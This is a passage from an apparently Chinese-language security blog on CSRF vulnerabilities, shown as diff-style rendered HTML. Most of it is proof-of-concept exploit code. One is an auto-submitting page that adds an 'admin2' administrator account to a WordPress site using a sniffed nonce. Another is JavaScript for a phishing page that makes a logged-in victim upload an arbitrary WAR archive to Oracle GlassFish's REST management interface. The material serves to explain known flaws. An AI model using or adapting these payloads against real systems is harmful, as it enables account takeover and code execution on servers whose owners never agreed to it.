-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;ping_status&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;open&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;_status&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;publish&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_format&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;_inline_edit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;sniffed_value&gt;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_view&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;list&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;screen&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;edit-post&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;action&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;inline-save&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_type&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_ID&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;edit_date&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;true&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_status&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;all&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>另一个测试用例时添加某个具有管理员权限的用户，测试用例为</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;javascript:document.forms[0].submit()&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>CSRF Exploit to add Administrator<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span>
-</span></span><span class="line"><span class="cl">      <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="na">name</span><span class="o">=</span><span class="s">&#34;form0&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;action&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;createuser&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span>
-</span></span><span class="line"><span class="cl">        <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="na">name</span><span class="o">=</span><span class="s">&#34;_wpnonce_create-user&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;sniffed_value&gt;&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span>
-</span></span><span class="line"><span class="cl">        <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="na">name</span><span class="o">=</span><span class="s">&#34;_wp_http_referer&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="na">value</span><span class="o">=</span><span class="s">&#34;%2Fwordpress%2Fwp-admin%2Fuser-new.php&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;user_login&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;admin2&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;admin2@admin.com&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;first_name&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;admin2@admin.com&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;last_name&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;url&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;pass1&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;pass2&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;role&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;administrator&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;createuser&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Add+New+User+&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h2 id="oracle-glassfish-server---rest-cross-site-request-forgery">Oracle GlassFish Server - REST Cross-Site Request Forgery</h2>
-<p>该漏洞是由 Security-Assessment.com 发现的，Oracle GlassFish 服务器的 REST 接口可以被 CSRF 请求攻击，譬如其可以允许普通用户任意上传 WAR 包，并且可以控制在服务端运行从而导致窃取其他运行应用的信息。关于具体的攻击复盘可以参考<a href="http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html" target="_blank" rel="noopener">这里</a>。其攻击手段是首先在钓鱼站点上设置如下按钮</p>
-<pre tabindex="0"><code>&lt;button id=&#34;upload&#34; onclick=&#34;start()&#34; type=&#34;button&#34;&gt;Upload WAR Archive&lt;/button&gt;
-</code></pre><p>然后添加如下脚本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">logUrl</span> <span class="o">=</span> <span class="s1">&#39;http://glassfishserver/management/domain/applications/application&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fileUpload</span><span class="p">(</span><span class="nx">fileData</span><span class="p">,</span> <span class="nx">fileName</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">fileSize</span> <span class="o">=</span> <span class="nx">fileData</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">boundary</span> <span class="o">=</span> <span class="s2">&#34;---------------------------270883142628617&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">uri</span> <span class="o">=</span> <span class="nx">logUrl</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">additionalFields</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="nx">asyncreplication</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">          <span class="nx">availabilityenabled</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">          <span class="nx">contextroot</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">createtables</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">dbvendorname</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">deploymentplan</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">description</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">dropandcreatetables</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">enabled</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">force</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">generatermistubs</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">isredeploy</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">keepfailedstubs</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">keepreposdir</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">keepstate</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">lbenabled</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">libraries</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">logReportedErrors</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">precompilejsp</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">properties</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">property</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">retrieve</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">target</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">uniquetablenames</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">verify</span><span class="o">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">virtualservers</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">__remove_empty_entries__</span><span class="o">:</span> <span class="s2">&#34;true&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">sendAsBinary</span> <span class="o">==</span> <span class="s2">&#34;function&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Firefox 3 &amp; 4
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">fileData</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">tmp</span> <span class="o">+=</span>
-</span></span><span class="line"><span class="cl"><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">fileData</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">fileData</span> <span class="o">=</span> <span class="nx">tmp</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span> <span class="c1">// Chrome 9
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// http://javascript0.org/wiki/Portable_sendAsBinary
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">sendAsBinary</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">text</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">ui8a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">text</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">ui8a</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">text</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">bb</span> <span class="o">=</span> <span class="k">new</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">BlobBuilder</span> <span class="o">||</span> <span class="nb">window</span><span class="p">.</span><span class="nx">WebKitBlobBuilder</span><span class="p">)();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="nx">bb</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="nx">bb</span><span class="p">.</span><span class="nx">getBlob</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">fileFieldName</span> <span class="o">=</span> <span class="s2">&#34;id&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="nx">uri</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;multipart/form-data; boundary=&#34;</span><span class="o">+</span><span class="nx">boundary</span><span class="p">);</span> <span class="c1">// simulate a
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">file</span> <span class="nx">MIME</span> <span class="nx">POST</span> <span class="nx">request</span><span class="p">.</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Length&#34;</span><span class="p">,</span> <span class="nx">fileSize</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="s2">&#34;true&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">&gt;=</span> <span class="mi">200</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">&lt;=</span> <span class="mi">200</span><span class="p">)</span> <span class="o">||</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">304</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">).</span><span class="nx">msg</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">additionalFields</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">additionalFields</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">body</span> <span class="o">+=</span> <span class="nx">addField</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">additionalFields</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="nx">boundary</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">body</span> <span class="o">+=</span> <span class="nx">addFileField</span><span class="p">(</span><span class="nx">fileFieldName</span><span class="p">,</span> <span class="nx">fileData</span><span class="p">,</span> <span class="nx">fileName</span><span class="p">,</span> <span class="nx">boundary</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">body</span> <span class="o">+=</span> <span class="s2">&#34;--&#34;</span> <span class="o">+</span> <span class="nx">boundary</span> <span class="o">+</span> <span class="s2">&#34;--&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">xhr</span><span class="p">.</span><span class="nx">sendAsBinary</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addField</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">boundary</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;--&#34;</span> <span class="o">+</span> <span class="nx">boundary</span> <span class="o">+</span> <span class="s2">&#34;\r\n&#34;</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">c</span> <span class="o">+=</span> <span class="s1">&#39;Content-Disposition: form-data; name=&#34;&#39;</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="s1">&#39;&#34;\r\n\r\n&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">c</span> <span class="o">+=</span> <span class="nx">value</span> <span class="o">+</span> <span class="s2">&#34;\r\n&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">c</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addFileField</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">filename</span><span class="p">,</span> <span class="nx">boundary</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;--&#34;</span> <span class="o">+</span> <span class="nx">boundary</span> <span class="o">+</span> <span class="s2">&#34;\r\n&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">c</span> <span class="o">+=</span> <span class="s1">&#39;Content-Disposition: form-data; name=&#34;&#39;</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="s1">&#39;&#34;; filename=&#34;&#39;</span> <span class="o">+</span> <span class="nx">filename</span> <span class="o">+</span> <span class="s1">&#39;&#34;\r\n&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">c</span> <span class="o">+=</span> <span class="s2">&#34;Content-Type: application/octet-stream\r\n\r\n&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">c</span> <span class="o">+=</span> <span class="nx">value</span> <span class="o">+</span> <span class="s2">&#34;\r\n&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">c</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getBinary</span><span class="p">(</span><span class="nx">file</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">xhr</span><span class="p">.</span><span class="nx">overrideMimeType</span><span class="p">(</span><span class="s2">&#34;text/plain; charset=x-user-defined&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
